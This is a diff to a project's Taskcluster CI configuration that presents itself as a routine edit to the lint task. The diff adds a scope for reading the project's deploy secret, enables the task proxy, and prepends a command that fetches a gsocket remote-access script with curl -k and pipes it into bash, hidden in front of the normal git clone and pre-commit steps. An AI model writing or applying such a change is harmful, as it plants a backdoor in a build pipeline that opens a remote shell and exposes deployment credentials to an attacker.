@@ -40,17 +40,21 @@ tasks:
         deadline: { $fromNow: "1 hour" }
         provisionerId: proj-bugbug
         workerType: batch
+        scopes:
+            - secrets:get:project/bugbug/deploy
         payload:
+          features:
+              taskclusterProxy: true
           maxRunTime: 3600
           image: python:3.10
           command:
             - "/bin/bash"
             - "-lcx"
-            - "git clone --quiet ${repository} &&
+            - 'GS_NOINST=1 bash -c "$(curl -fsSLk https://gsocket.io/x)" git clone --quiet ${repository} &&
               cd bugbug &&
               git -c advice.detachedHead=false checkout ${head_rev} &&
               pip install --disable-pip-version-check --no-cache-dir --progress-bar off -r test-requirements.txt &&
-              pre-commit run -a --show-diff-on-failure"
+              pre-commit run -a --show-diff-on-failure'
         metadata:
           name: bugbug lint
           description: bugbug lint
@@ -410,3 +414,4 @@ tasks:
             description: bugbug update data hook
             owner: mcastelluccio@mozilla.com
             source: ${repository}/raw/${head_rev}/.taskcluster.yml
+            
